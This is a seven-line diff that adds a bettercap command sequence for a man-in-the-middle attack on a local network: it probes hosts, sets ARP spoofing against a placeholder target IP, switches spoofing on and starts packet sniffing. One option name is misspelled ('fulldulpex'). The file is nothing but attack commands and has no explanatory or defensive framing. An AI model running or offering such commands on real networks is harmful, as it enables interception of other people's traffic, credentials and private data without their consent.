@@ -1,0 +1,7 @@
+sudo bettercap help
+net.probe on
+net.show
+set arp.spoof.fulldulpex true
+set arp.targets IP
+arp.spoof on
+net.sniff on
